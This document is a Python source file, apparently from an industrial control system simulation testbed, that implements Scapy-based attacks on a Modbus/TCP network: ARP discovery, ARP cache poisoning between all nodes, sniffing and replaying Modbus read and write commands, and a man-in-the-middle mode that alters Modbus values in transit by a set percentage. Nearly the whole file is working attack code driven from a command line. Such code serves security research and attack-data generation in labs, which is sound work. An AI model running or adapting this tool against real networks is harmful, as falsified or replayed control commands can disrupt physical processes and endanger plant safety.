import argparse

from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether

from ics_sim.protocol import ModbusBase, ClientModbus


class ModbusTCP(Packet):
    name = "mbtcp"
    fields_desc = [ ShortField("TransID", 0),
                    ShortField("ProtocolID", 0),
                    ShortField("Length", 0),
                    ByteField("Unit Identifier",0)
                    ]

class ModbusWriteRequest(Packet):
    name: "modbus"
    fields_desc = [ByteField("Command",0),
                   ShortField("Reference", 0),
                   ShortField("WordCnt",0),
                   ByteField("ByteCnt", 0),
                   ShortField("Data0", 0),
                   ShortField("Data1", 0),
                   ]
class ModbusReadRequest(Packet):
    name: "modbus"
    fields_desc = [ByteField("Command",0),
                   ShortField("Reference", 0),
                   ShortField("WordCnt",0),
                   ]

class ModbusReadResponse(Packet):
    name: "modbus"
    fields_desc = [ByteField("Command",0),
                   ByteField("ByteCnt", 0),
                   ShortField("Data0", 0),
                   ShortField("Data1", 0),
                   ]



class NetworkNode:
    def __init__(self, ip, mac):
        self.IP = ip
        self.MAC = mac

    def is_switch(self):
        return self.IP.split('.')[3] == '1'

    def __str__(self):
        return 'IP:{} MAC:{}'.format(self.IP, self.MAC)


class ModbusCommand:
    clients = dict()

    def __init__(self, sip, dip, port, command, address, value, time):
        self.sip = sip
        self.dip = dip
        self.port = port
        self.command = command
        self.address = address
        self.value = value
        self.time = time

    def __str__(self):
        return 'sip:{} dip{} port:{} command:{} address:{} value:{} time:{}'.format(
            self.sip, self.dip, self.port, self.command, self.address, self.value, self.time)

    def send_fake(self):
        if not ModbusCommand.clients.keys().__contains__((self.dip, self.port)):
            ModbusCommand.clients[(self.dip, self.port)] = ClientModbus(self.dip, self.port)

        client = ModbusCommand.clients[(self.dip, self.port)]

        if self.command ==3: # read modbus request
            client.receive(int(self.address/2))

        if self.command == 16: # write modbus request
            client.send(int(self.address/2) , int(self.value))



class AttackerScapy:

    sniff_commands = []
    sniff_time = None
    error = 0

    @staticmethod
    def discovery( dst, time):
        nodes = []
        ethernet_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_layer = ARP(pdst=dst)
        ans, unans = srp(ethernet_layer / arp_layer, timeout=int(2)) #todo: fix timeout

        for sent, received in ans:
            nodes.append( NetworkNode(received[ARP].psrc, received[ARP].hwsrc))
        return nodes

    @staticmethod
    def get_mac_address(ip_address):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
        answered, unanswered = srp(packet, timeout=2, verbose=0)

        for sent,received in answered:
            return received[ARP].hwsrc

    @staticmethod
    def poison_arp_table(src, dst):
        print("Poisoning {} <==> {} .... started".format(src.IP, dst.IP))
        gateway_to_target = ARP(op=2, hwdst= src.MAC, psrc= dst.IP, pdst= src.IP)
        target_to_gateway = ARP(op=2, hwdst= dst.MAC, psrc= src.IP, pdst= dst.IP)
        try:
            send(gateway_to_target, verbose=0)
            send(target_to_gateway, verbose=0)
            send(gateway_to_target, verbose=0)
            send(target_to_gateway, verbose=0)
        except Exception as e:
            sys.exit()
        print("Poisoning done")

    @staticmethod
    def poison_arp_tables(nodes):
        print("Group poisoning done...")

        try:
            for src in nodes:
                for dst in nodes:
                    if src.is_switch() or dst.is_switch()  or src.IP <= dst.IP:
                        continue
                    AttackerScapy.poison_arp_table(src, dst)
        except Exception as e:
            sys.exit()
        print("Group poisoning done...")

    @staticmethod
    def restore_arp_table(src, dst):
        print("Restoring... {} and {}".format(src, dst))

        dst_src_fix = ARP(op=2, hwsrc= dst.MAC, psrc= dst.IP, pdst= src.IP, hwdst="ff:ff:ff:ff:ff:ff")
        arp_layer = ARP(op=2, hwsrc= src.MAC, psrc= src.IP, pdst= dst.IP, hwdst="ff:ff:ff:ff:ff:ff")
        send(dst_src_fix, count=5, verbose= 0)
        send(arp_layer, count=5, verbose= 0)
        print("Restoring done...")

    @staticmethod
    def restore_arp_tables(nodes):
        print("Restoring... ")
        for src in nodes:
            for dst in nodes:
                if src.is_switch() or dst.is_switch() or src.IP == dst.IP:
                    continue

                fix = ARP(op=2, hwsrc= dst.MAC, psrc= dst.IP, pdst= src.IP, hwdst="ff:ff:ff:ff:ff:ff")
                send(fix, count=5, verbose=0)
        print("Restoring done...")


    def sniff_callback(packet):
        if not packet.haslayer('TCP'):
            return

        if packet['TCP'].dport != 502:
            return

        if len(packet['TCP'].payload) <= 0:
            return

        if str(packet['Ethernet'].src).endswith(":c0:a8:00:2b"):
            return

        tcppacket = ModbusTCP(packet['TCP'].payload.load)
        modbuspacket = ModbusWriteRequest(tcppacket.payload.load)
       # value = 0 if modbuspacket.Command!=16  \
       #     else (pow(2, 16) * modbuspacket.Data0 + modbuspacket.Data1) / 10000

        command = ModbusCommand(
            packet['IP'].src,
            packet['IP'].dst,
            packet['TCP'].dport,
            modbuspacket.Command,
            modbuspacket.Reference,

            (pow(2, 16) * modbuspacket.Data0 + modbuspacket.Data1) / 10000,  # todo
            datetime.now().timestamp()
        )
        print("packet-recieved")
        AttackerScapy.sniff_commands.append( command)

    def inject_callback(packet):
        print("packet detected")
        if not packet['Ethernet'].dst.endswith(":c0:a8:00:2b"):
            return

        if not packet.haslayer('IP'):
            return

        new_packet = IP(dst=packet['IP'].dst, src=packet['IP'].src)
        new_packet['IP'].payload = packet['IP'].payload


        if new_packet.haslayer('TCP') and len(new_packet['TCP'].payload) > 0:
            tcppacket = ModbusTCP(packet['TCP'].payload.load)
            if tcppacket.Length == 7 or tcppacket.Length == 11:
                if tcppacket.Length == 7:
                    modbuspacket = ModbusReadResponse(tcppacket.payload.load)
                if tcppacket.Length == 11:
                    modbuspacket = ModbusWriteRequest(tcppacket.payload.load)

                number = (pow(2, 16) * modbuspacket.Data0 + modbuspacket.Data1) / 10000
                number += (number * AttackerScapy.error) / 100
                number = int( number * 10000)
                Data0 = int(number / pow(2, 16))
                Data1 = int(number % pow(2, 16))
                offset = len(new_packet['TCP'].payload.load) - 4
                new_packet['TCP'].payload.load = \
                    new_packet['TCP'].payload.load[:offset] + Data0.to_bytes(2, 'big')+ Data1.to_bytes(2, 'big')

        del new_packet[IP].chksum
        del new_packet[IP].payload.chksum
        send(new_packet)

     
    @staticmethod
    def clear_sniffed():
        AttackerScapy.sniff_commands = []
        AttackerScapy.sniff_time = None

    @staticmethod
    def start_sniff(sniff_callback_func, filter_string , timeout):
        AttackerScapy.clear_sniffed()
        AttackerScapy.sniff_time = datetime.now().timestamp()
        sniff(prn=sniff_callback_func, filter=filter_string, timeout=timeout)

    @staticmethod
    def scan_link(target_ip, gateway_ip, timeout):
        # assuming we have performed the reverse attack, we know the following
        AttackerScapy.clear_sniffed()

        target_mac = AttackerScapy.get_mac_address(target_ip)
        gateway_mac = AttackerScapy.get_mac_address(gateway_ip)


        AttackerScapy.poison_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                       NetworkNode(target_ip, target_mac))
        AttackerScapy.start_sniff(AttackerScapy.sniff_callback, "ip host " + target_ip, timeout)
        AttackerScapy.restore_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                        NetworkNode(target_ip, target_mac))

        return AttackerScapy.sniff_commands

    @staticmethod
    def scan_network(destination, timeout):
        AttackerScapy.clear_sniffed()

        nodes = AttackerScapy.discovery(destination, timeout)
        AttackerScapy.poison_arp_tables(nodes)
        AttackerScapy.start_sniff(AttackerScapy.sniff_callback, "", timeout)
        AttackerScapy.restore_arp_tables(nodes)

        return AttackerScapy.sniff_commands

    def inject_link(target_ip, gateway_ip, timeout):
        target_mac = AttackerScapy.get_mac_address(target_ip)
        gateway_mac = AttackerScapy.get_mac_address(gateway_ip)

        AttackerScapy.poison_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                       NetworkNode(target_ip, target_mac))
        AttackerScapy.start_sniff(AttackerScapy.inject_callback, "ip host " + target_ip, timeout)
        AttackerScapy.restore_arp_table(NetworkNode(gateway_ip, gateway_mac),
                                        NetworkNode(target_ip, target_mac))

    @staticmethod
    def inject_network(destination, timeout):
        nodes = AttackerScapy.discovery(destination, timeout)
        AttackerScapy.poison_arp_tables(nodes)
        AttackerScapy.start_sniff(AttackerScapy.inject_callback, "", timeout)
        AttackerScapy.restore_arp_tables(nodes)

    @staticmethod
    def replay_sniffed_packets():
        start = datetime.now().timestamp()
        for command in AttackerScapy.sniff_commands:
            delay = (command.time - AttackerScapy.sniff_time) - (datetime.now().timestamp() - start)
            if (delay>0):
                time.sleep(delay)
                command.send_fake()


    @staticmethod
    def scan_attack(destination , timeout, logger):
        nodes = AttackerScapy.discovery(destination, timeout)
        logger.info('# Found {} in the network {}:'.format(len(nodes), destination))
        for node in nodes:
            logger.info(str(node))

    @staticmethod
    def replay_attack(destination , sniff_time, replay_cnt, logger):
        #packets = AttackerScapy.scan_network(destination, sniff_time)
        packets = AttackerScapy.scan_link("192.168.0.11","192.168.0.22",sniff_time)

        for i in range(replay_cnt):
            AttackerScapy.replay_sniffed_packets()

        logger.info('# Sniffed {} packets in the network {}:'.format(len(packets), destination))
        for packet in packets:
            logger.info(str(packet))

    @staticmethod
    def mitm_attack(destination, sniff_time, error, logger):
        AttackerScapy.error = error
        AttackerScapy.inject_network(destination, sniff_time)
        #AttackerScapy.inject_link("192.168.0.11","192.168.0.22", sniff_time)





if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='PCAP reader')
    parser.add_argument('--output', metavar='<csv file name>',
                        help='csv file to output', required=True)
    parser.add_argument('--attack', metavar='determine type of attack',
                        help='attack type could be scan, replay, mitm', required=True)

    parser.add_argument('--timeout', metavar='specify attack timeout', type=int, default=10,
                        help='attack timeout for attacks, MitM/Replay attacks: attack seconds, scan: packets', required=False)

    parser.add_argument('--destination', metavar='determine attack destination',
                        help='determine attack destination', required=False)
    parser.add_argument('--parameter', metavar='determine attack parameter', type=int, default=5,
                        help='determine attack parameter', required=False)

    parser.parse_args()
    args = parser.parse_args()


    handler = logging.FileHandler(args.output, mode="w")
    handler.setFormatter(logging.Formatter('%(message)s'))
    logger = logging.getLogger(args.attack)
    logger.setLevel(logging.INFO)
    logger.addHandler(handler)


    if args.attack == 'scan':
        AttackerScapy.scan_attack(args.destination, args.timeout, logger)

    if args.attack == 'replay':
        AttackerScapy.replay_attack(args.destination, args.timeout, args.parameter, logger)

    if args.attack == 'mitm':
        AttackerScapy.mitm_attack(args.destination, args.timeout, args.parameter, logger)